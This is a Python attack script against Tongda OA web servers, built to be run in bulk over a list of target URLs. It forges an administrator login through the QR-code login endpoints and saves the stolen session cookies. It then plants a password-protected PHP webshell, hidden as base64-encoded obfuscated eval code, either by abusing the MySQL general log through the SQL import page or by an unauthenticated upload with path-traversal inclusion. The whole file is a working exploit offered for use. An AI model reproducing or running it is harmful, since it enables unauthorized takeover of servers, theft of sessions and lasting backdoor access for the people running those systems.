import time
import json
import base64
import hashlib
import urllib3
import requests
import functools
import threadpool
from lxml import etree

urllib3.disable_warnings()
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}
# debug
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


# global settings
def modified_session():
    s = requests.Session()
    s.request = functools.partial(s.request, headers=headers, verify=False, timeout=15)
    return s


def check_flag(flag = ""):
    if flag:
        return hashlib.md5(flag.encode("utf-8")).hexdigest()
    else:
        now = str(time.time())
        return hashlib.md5(now.encode("utf-8")).hexdigest()


def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")
        return vurl


def get_cookie(url):
    session = modified_session()
    try:
        r1 = session.get(url + "/ispirit/login_code.php")
        if r1.status_code == 200 and "codeuid" in r1.text: 
            codeUid = json.loads(r1.text)["codeuid"]
        else:
            r1 = session.get(url + "/general/login_code.php")
            status = r1.text.find('{"status":1')
            if r1.status_code == 200 and status != -1:
                codeUid = json.loads(r1.text[status:])["code_uid"]
            else:
                return False
        data = {"codeuid": codeUid, "uid": int(1), "source": "pc", "type": "confirm", "username": "admin"}
        r2 = session.post(url + "/general/login_code_scan.php", data=data)
        if r2.status_code == 200 and json.loads(r2.text)["status"] == "1":
            r3 = session.get(url + "/ispirit/login_code_check.php?codeuid=" + codeUid)
            if r3.status_code == 200 and '"uid":"1"' in r3.text:
                return r3.headers["Set-Cookie"]
    except:
        pass
    return False


def get_info(url, cookieDict):
    session = modified_session()
    requests.utils.add_dict_to_cookiejar(session.cookies, cookieDict)
    try:
        r1 = session.get(url + "/general/system/security/service.php")
        if r1.status_code == 200 and "Webroot" in r1.text:
            html1 = etree.HTML(r1.text)
            webRoot = html1.xpath('//input[@name="WEBROOT"]/@value')[0].replace("\\", "/")
            # attachPath = html1.xpath('//input[@name="DEFAULT_ATTACH_PATH"]/@value')[0].replace("\\", "/")
            # r2 = session.get(url + "/general/system/reg_view/index.php")
            # html2 = etree.HTML(r2.text)
            # infoList = html2.xpath('//td[contains(@class,"") or contains(@class,"TableContent")]//text()')
            # dataVer = infoList[infoList.index("\xa0数据库数据版本号：")+1].strip()
            # dataVer = float(dataVer.rsplit(".", 1)[0])
            # if int(dataVer) == 11:
            #     tongdaVer = dataVer
            # elif int(dataVer) == 10:
            #     tongdaVer = 2017
            # elif int(dataVer) == 9:
            #     tongdaVer = 2016
            # elif int(dataVer) == 8:
            #     tongdaVer = 2015
            # elif int(dataVer) == 6 or 7:
            #     tongdaVer = 2013
            # else:
            #     tongdaVer = 0
            # return {"webRoot": webRoot, "attachPath": attachPath, "tongdaVer": tongdaVer}
            return {"webRoot": webRoot}
    except:
        return False


def mysql_log_getshell(url, cookieDict, webRoot, contents):
    flag = check_flag()
    tempName = flag + ".php"
    logPath = webRoot.rsplit("/", 1)[0] + "/data5/WIN-J1S8L919HTC.log"
    contents = contents + '<?php unlink(__FILE__);unlink("' + logPath + '");echo "' + flag + '";?>'
    sql = "set global general_log='on';SET global general_log_file='%s/%s';SELECT '%s';SET global general_log_file='%s';SET global general_log='off';" % (webRoot, tempName, contents, logPath)
    files = {"sql_file": ("123.sql", sql, "application/octet-stream")}
    session = modified_session()
    try:
        r1 = session.post(url + "/general/system/database/sql.php", cookies=cookieDict, files=files, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"})
        if r1.status_code == 200 and "数据库脚本导入完成！" in r1.text:
            r2 = session.get(url + "/" + tempName)
            if r2.status_code == 200 and flag in r2.text:
                return True
    except:
        pass
    return False


def unauth_upload_shell(url, cookieDict, contents):
    flag = check_flag()
    contents = contents + '<?php echo "' + flag + '";?>'
    data1 = {"UPLOAD_MODE": "1", "P": cookieDict["PHPSESSID"], "DEST_UID": "1"}
    files = {"ATTACHMENT": ("jpg", contents, "image/jpeg")}
    session = modified_session()
    requests.utils.add_dict_to_cookiejar(session.cookies, cookieDict)
    try:
        r1 = session.post(url + "/ispirit/im/upload.php", data=data1, files=files, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"})
        text = r1.text
        if r1.status_code == 200 and "[vm]" in text:
            uploadFilePath = text[text.find("@")+1:text.find("|")].replace("_", "/")
            data2 = 'json={"url":"/general/../../attach/im/%s.jpg"}' % uploadFilePath
            r2 = session.post(url + "/mac/gateway.php", data=data2)
            if r2.status_code == 404 or flag not in r2.text:
                r2 = session.post(url + "/ispirit/interface/gateway.php", data=data2)
            if r2.status_code == 200 and flag in r2.text:
                return True
    except:
        pass
    return False
    

def exp(url):
    shellName = "templates.php"
    tongdaDir = "/"
    shellFlag = check_flag()
    # password:a
    # POST method
    # base64.decode: <?php $a="~+d()"^"!{+{}";$b=${$a}["a"];eval("".$b);?>
    b64Shell = "PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJhIl07ZXZhbCgiIi4kYik7Pz4="

    writeShell = '<?php file_put_contents($_SERVER["DOCUMENT_ROOT"]."/%s",base64_decode("%s")."%s");?>' % (tongdaDir + shellName, b64Shell, shellFlag)
    printFlag = ""
    sucess = False
    cookie = get_cookie(url)
    cookieDict = {"PHPSESSID": "no_cookie"}
    if cookie:
        loginCookie = "%s/general/index.php\t%s" % (url, cookie)
        printFlag = "[Login]：%s\n" % loginCookie
        wirte_targets(loginCookie, "cookie.txt")
        cookieDict = dict([l.split("=", 1) for l in cookie.split(";")])
        info = get_info(url, cookieDict)
        if info:
            sucess = mysql_log_getshell(url, cookieDict, info["webRoot"], writeShell)
    if sucess == False:
        sucess = unauth_upload_shell(url, cookieDict, writeShell)
    if sucess:
        session = modified_session()
        shellPath = url + tongdaDir + shellName
        try:
            r3 = session.get(shellPath)
            if r3.status_code == 200 and shellFlag in r3.text:
                printFlag = "[Getshell]：%s\t%s\n" % (shellPath, cookie)
                wirte_targets(shellPath, "shell.txt")
        except:
            pass
    print(printFlag, end="")


def multithreading(funcname, params, filename, pools):
    works = []
    with open(filename, 'r') as f:
        for i in f:
            func_params = [i.rstrip("\n")] + params
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


def main():
    urlList = "url.txt"
    extraParams = []
    threads = 8
    multithreading(exp, extraParams, urlList, threads)


if __name__ == "__main__":
    main()

# Usage: python tongda.py
#   url.txt:      URL list
# Default webshell password:a
# Result:
#   shell.txt:    uploaded webshell
#   cookie.txt:   valid login cookie
